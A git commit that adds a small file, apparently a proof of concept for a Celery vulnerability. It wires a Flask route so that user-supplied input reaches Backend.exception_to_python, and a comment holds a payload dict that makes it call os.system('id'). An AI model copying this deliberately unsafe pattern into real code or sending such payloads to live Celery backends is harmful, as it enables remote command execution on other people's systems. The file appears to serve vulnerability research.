113e9e617ea1ef9dc30a8d95a0e7dbf4cd70ba34
ngjiekang <64952428+ngjiekang@users.noreply.github.com>
2024-02-18 20:36:26 +0800

    Create test_vul.py

---
+++ t/unit/backends/test_vul.py
@@ -0,0 +1,10 @@
+from celery.backends.base import Backend
+from celery import Celery
+
+from flask import Flask, request
+app = Flask(__name__)
+@app.route("/files/<exc>")
+def test_vul(exc):
+  b = Backend(Celery())
+  #exc = {'exc_module':'os',  'exc_type':'system', 'exc_message':'id'}
+  b.exception_to_python(exc)
